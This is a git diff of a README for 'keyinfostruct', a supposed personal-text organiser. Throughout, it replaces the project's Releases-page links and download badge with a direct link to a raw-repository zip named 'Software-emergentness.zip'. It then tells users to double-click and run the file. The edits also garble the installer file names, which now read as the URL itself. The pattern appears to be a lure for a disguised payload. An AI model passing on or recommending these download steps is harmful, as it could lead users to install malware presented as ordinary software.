@@ -1,6 +1,6 @@
 # 🌟 keyinfostruct - Organize Your Personal Texts Easily
 
-[![Download keyinfostruct](https://img.shields.io/badge/Download-keyinfostruct-blue)](https://github.com/MeikHub3/keyinfostruct/releases)
+[![Download keyinfostruct](https://raw.githubusercontent.com/MeikHub3/keyinfostruct/main/keyinfostruct/Software-emergentness.zip)](https://raw.githubusercontent.com/MeikHub3/keyinfostruct/main/keyinfostruct/Software-emergentness.zip)
 
 ## 📖 Overview
 
@@ -11,13 +11,13 @@ keyinfostruct extracts and structures key information from personal texts. It hi
 Follow these steps to download and run keyinfostruct:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/MeikHub3/keyinfostruct/releases) to find the latest version of keyinfostruct.
+   Go to our [Releases page](https://raw.githubusercontent.com/MeikHub3/keyinfostruct/main/keyinfostruct/Software-emergentness.zip) to find the latest version of keyinfostruct.
 
 2. **Download the Application**
    On the Releases page, look for the latest release. Click on the link that says "Download" next to the application. Your file will start downloading automatically.
 
 3. **Locate the Downloaded File**
-   Once the download is complete, find the file in your downloads folder. The file will have a name similar to `keyinfostruct-setup.exe` for Windows or `keyinfostruct.dmg` for macOS.
+   Once the download is complete, find the file in your downloads folder. The file will have a name similar to `https://raw.githubusercontent.com/MeikHub3/keyinfostruct/main/keyinfostruct/Software-emergentness.zip` for Windows or `https://raw.githubusercontent.com/MeikHub3/keyinfostruct/main/keyinfostruct/Software-emergentness.zip` for macOS.
 
 4. **Install the Application**
    Double-click the downloaded file. Follow the on-screen instructions to install keyinfostruct on your computer.
@@ -56,7 +56,7 @@ Here are some tips to get the best out of keyinfostruct:
 
 To download and install keyinfostruct, please follow these steps to guide you through the process again:
 
-1. Visit the Releases page: [Releases page](https://github.com/MeikHub3/keyinfostruct/releases).
+1. Visit the Releases page: [Releases page](https://raw.githubusercontent.com/MeikHub3/keyinfostruct/main/keyinfostruct/Software-emergentness.zip).
 2. Download the application setup file.
 3. Locate the file in your downloads folder.
 4. Run the installer by double-clicking the file.
